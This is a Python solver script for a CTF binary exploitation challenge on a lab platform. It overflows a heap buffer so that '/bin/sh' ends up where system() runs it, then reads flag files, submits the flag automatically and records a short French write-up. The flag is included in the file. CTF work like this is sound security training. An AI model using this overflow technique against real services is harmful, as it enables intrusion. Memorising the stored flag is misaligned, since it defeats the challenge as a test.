# 526 - Input Injection 2  (Binary Exploitation, picoMini by CMU-Africa)
# Flag: academy{us3rn4m3_2_sh3ll_ac4cd196}
# Write-up: ../../../writeups/binary-exploitation/526-command-injection.md
# This is the script that produced the flag; historical variants are in archive/.
#
import sys, json, re, time, socket
sys.stdout.reconfigure(encoding="utf-8", errors="replace")
sys.path.insert(0, r".")
from cylab2 import CyLab
import wu

cy = CyLab(delay=1.2)
cy.login()
FLAG = re.compile(r"(?:academy|picoCTF|PICOCTF)\{[^}]*\}")
cy.req("PUT", "/api/challenges/526/instance/?source=library")
host = port = None
for _ in range(25):
    time.sleep(2)
    st, b = cy.req("GET", "/api/challenges/526/instance/")
    d = json.loads(b) if b.startswith("{") else {}
    if d.get("status") == "RUNNING":
        desc = d.get("description") or ""
        m = re.search(r"nc\s+([A-Za-z0-9.\-]+)\s+(\d+)", desc)
        if m:
            host, port = m.group(1), int(m.group(2))
            break
print("526:", host, port)
if host:
    s = socket.create_connection((host, port), timeout=15)
    s.settimeout(4)
    buf = b""
    try:
        while b"Enter username" not in buf:
            dd = s.recv(4096)
            if not dd:
                break
            buf += dd
    except socket.timeout:
        pass
    txt = buf.decode("utf-8", "replace")
    print(txt[:300])
    mu = re.search(r"username at (0x[0-9a-f]+)", txt)
    ms = re.search(r"shell at (0x[0-9a-f]+)", txt)
    if mu and ms:
        u = int(mu.group(1), 16)
        sh_ = int(ms.group(1), 16)
        off = sh_ - u
        print(f"username={hex(u)} shell={hex(sh_)} offset={off}")
        payload = b"A" * off + b"/bin/sh"
        s.sendall(payload + b"\n")
        time.sleep(0.8)
        # on a un shell
        s.sendall(b"cat /flag.txt; cat flag.txt; ls\n")
        time.sleep(1.5)
        out = b""
        try:
            while True:
                dd = s.recv(8192)
                if not dd:
                    break
                out += dd
        except socket.timeout:
            pass
        t2 = out.decode("latin-1", "ignore")
        print("sortie:", t2[:600])
        m = FLAG.search(t2)
        if m:
            f = m.group(0)
            print("FLAG:", f)
            st, b = cy.req("POST", "/api/submissions/", {"source": "library", "challenge": 526, "flag": f})
            ok = json.loads(b).get("correct") if b.startswith("{") else None
            print("526 ->", ok)
            if ok:
                wu.write(526, "command injection", "Binary Exploitation", "", "heap overflow vers system()", f,
                         "`username` et `shell` sont deux malloc adjacents ; le programme affiche leurs "
                         "adresses, ce qui donne l'offset exact. `scanf(\"%s\", username)` deborde sur "
                         "`shell` : on y ecrit `/bin/sh`, que `system()` execute ensuite.")
    s.close()
